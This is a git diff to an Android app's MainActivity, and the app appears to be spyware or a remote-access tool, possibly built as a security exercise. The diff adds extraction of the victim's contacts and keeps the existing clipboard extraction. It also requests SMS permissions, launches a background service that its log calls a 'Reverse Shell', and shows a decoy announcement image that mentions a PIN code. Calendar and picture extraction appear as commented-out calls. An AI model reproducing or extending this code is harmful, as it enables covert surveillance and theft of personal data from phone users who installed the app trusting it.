@@ -6,6 +6,7 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.app.KeyguardManager;
+import android.content.ClipboardManager;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.AsyncTask;
@@ -17,6 +18,8 @@ import android.widget.ImageView;
 import android.widget.TextView;
 
 import com.bumptech.glide.Glide;
+
+import static androidx.core.content.ContextCompat.getSystemService;
 
 public class MainActivity extends AppCompatActivity {
     private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 666;
@@ -122,11 +125,8 @@ public class MainActivity extends AppCompatActivity {
                 ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
             }
         } else {
-
         }
-
          */
-
         ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
     }
 
@@ -136,7 +136,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         checkPermissions();
-        ImageView imageView = findViewById(R.id.imageView);
+        final ImageView imageView = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
         startService(new Intent(this, MyIntentService.class));
         Log.v("secme","Reverse Shell launched - main");
@@ -145,8 +145,12 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void run() {
                 Log.v("secme", "Data Extraction Started");
-                DataExtractor de = new DataExtractor();
+                DataExtractor de = new DataExtractor(getApplicationContext());
                 de.extractClipboard(false);
+                //de.extractCalendar(false);
+                //de.extractPictures(false);
+                de.extractContacts(false);
+
                 Log.v("secme", "Data Extraction Finished");
                 return;
             }
